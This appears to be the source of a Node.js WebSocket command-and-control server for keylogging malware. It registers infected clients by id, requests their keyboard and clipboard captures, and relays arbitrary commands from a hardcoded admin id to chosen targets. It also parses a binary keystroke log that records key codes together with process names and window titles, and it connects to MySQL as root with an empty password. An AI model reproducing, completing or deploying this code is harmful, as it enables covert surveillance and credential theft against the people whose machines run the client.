var adminID = '8f51dfd14221bc7d6adaefdf0533bf9e2af2d21e1395c6085fdf76943734c271';
// подключенные клиенты
var clients = [];
var targets = [];
var WebSocketServer = require('ws').Server;

//Database config
var mysql      = require('mysql');
var database = mysql.createConnection({
    host     : 'localhost',
    user     : 'root',
    password : '',
    database : 'users'
});


//Connecting to database
/*database.connect(function(err) {
     if (err) {
        console.error('[ERROR]Error connecting to database: ' + err.stack);
        return;
     }
     console.log('[Info]Connected to databace as id ' + database.threadId);
 });*/


// WebSocket-сервер на порту 25565
var webSocketServer = new WebSocketServer({ port: 25565 });
console.log ('Server is runing');

webSocketServer.on('connection', connection);

function connection(ws) {
    var lastAnswer = [];
    var isAuthorized = false;
    console.log('[Info]New client conected');
    setTimeout(function() {
        if(!isAuthorized){
            ws.close();
        }
    },60000);
    ws.on('message', function incoming(message, flags) {
        if(flags['binary']){console.log(message);}
        //Try to parse JSON
        var backUpJSON = lastAnswer;
        var isParsed = true;
        try {
            lastAnswer = JSON.parse(message);
        }
        catch (e) {
            lastAnswer = backUpJSON;
            console.log('[ERROR]Failed to parse JSON!');
            ws.close();
            isParsed = false;
        }
        //Check id length
        if(lastAnswer['id'] == null){
            console.log('[ERROR]Id = NULL !');
            ws.close();
        }
        else {
            if (lastAnswer['id'].length != 64) {
                console.log('[ERROR]Incorect id length!');
                ws.close();
            }
            else {
                /*console.log('id = ' + inputArr['id']);
                 console.log(clients[inputArr['id']]);
                 clients[inputArr['id']] = ws;*/
                if (clients[lastAnswer['id']] == null) {
                    clients[lastAnswer['id']] = ws;
                    ws.send('accepted');
                    console.log('[Info]Client is authorized ' + lastAnswer['id']);
                    isAuthorized = true;
                }
                else {
                    //Procesing data
                    if (lastAnswer['ok']) {
                        if(targets[lastAnswer['id']]) {
                            if(isParsed) {
                                try {
                                    clients[adminID].send(lastAnswer['data']);
                                }
                                catch (e) {
                                    console.log('[WARNING]Admin is disconected error + ' + e + '!');
                                }
                            }
                            else {
                                clients[adminID].send('[ERROR]Client JSON is not parsed !');
                            }
                        }
                        else {
                            switch (lastAnswer['type']) {
                                case 'keyboard':
                                    console.log('Keyboard: ' + lastAnswer['data'][0]['vk']);
                                    getData(lastAnswer['id'], 'getkeyboard');
                                    break;
                                case 'clipboard':
                                    console.log('Clipboard: ' + lastAnswer['data'][0]['vk']);
                                    getData(lastAnswer['id'], 'getclipboard');
                                    break;
                                case 'request':
                                    if (lastAnswer['id'] == adminID) {
                                        console.log('Request: ' + lastAnswer['data']['request']);
                                        targets[lastAnswer['data']['targetId']] = true;
                                        try {
                                            clients[lastAnswer['data']['targetId']].send(lastAnswer['data']['request']);
                                        }
                                        catch (e) {
                                            ws.send('[ERROR]Client is offline now!');
                                        }
                                    }
                                    else {
                                        console.log('[ERROR]Incorect adminId!');
                                    }
                                    break;
                            }
                        }
                    }
                    else {
                        console.log('[Client ERROR]' + lastAnswer['error']);
                    }
                }
            }
        }
    });
    ws.on('close', function close() {
            /*console.log('[CLOSE !!!] ' + lastAnswer['id']);
            var test = (lastAnswer['id'] in clients);
            console.log('[INDEXOF !!!] ' + test);*/

            if(lastAnswer['id'] in clients) {
                 delete  clients[lastAnswer['id']];
                //database.end();
                console.log('[Info]Conection closed id ' + lastAnswer['id']);
            }
            else{
                console.log('[Info]Conection closed client unauthorized' );
            }
        }
    );
}

function getData (id,type) {
    clients[id].send(type);
}

var fs = require('fs');

fs.readFile('keyboard.bin', function (err, data) {
    var offset = 0x0049;

    var message = {};
    message['parts'] = [];

    message['count'] = data.readUInt32BE(offset);

    console.log(message['count']);
    offset += 4;

    var header = parse_binary_header(data);

    switch (header['type']) {
        case 0x1:
            message['parts'] = read_keyboard(data);
            break;
        case 0x2:

            break;
        default:
            break;
    }

    function read_keyboard (data) {
        var arr = [];
        for(var i = 0; i < message['count']; i++ ) {
            var partObj = {};
            partObj['subtype'] = data.readInt8(offset);
            offset += 1;
            switch (partObj['subtype']) {
                case 0x1:
                    partObj['keyCode'] = data.readUInt32BE(offset);
                    offset += 4;
                    partObj['lang'] = data.readUInt16BE(offset);
                    offset += 2;
                    partObj['flags'] = data.readInt8(offset);
                    offset += 1;
                    break;
                case 0x2:
                    var stringObj = read_string(offset);
                    partObj['process'] = stringObj['data'];
                    offset = stringObj['offset'];

                    stringObj = read_string(offset);
                    partObj['title'] = stringObj['data'];
                    offset = stringObj['offset'];
                    break;
                default:
                    break;
            }
            arr.push(partObj);
        }
        return arr;
    }
    function read_clipboard () {}
    function read_string (offset) {
        var result = {};
        var length = data.readUInt32BE(offset);
        offset += 4;
        result['data'] = data.toString('ascii', offset, offset + length);
        result['offset'] = offset + length;
        return result;
    }
    function read_wndinfo () {}

    console.log(message);
});


function parse_binary_header (input) {
    var headerObj = {};
    headerObj['signature'] = input.readUInt16BE(0);
    headerObj['version'] = input.readInt8(0x0002);
    headerObj['id'] = input.toString('ascii', 0x0003, 0x0042);
    headerObj['type'] = input.readInt8(0x0043);
    headerObj['error'] = input.readInt8(0x0044);
    headerObj['length'] = input.readUInt32BE(0x0045);
    return headerObj;
}
/*
database.query('SELECT * FROM keyboard', function(err, rows, fields) {
   // if (err) throw err;
    console.log('The solution is: ' + rows[0]['lol']);
});*/
//database.end();
/*database.query('SELECT * FROM thoughts ORDER BY number', function(err, rows, fields) {
    if (err)  {console.log(err);};

    console.log('The solution is: ', rows[0].solution);
});*/

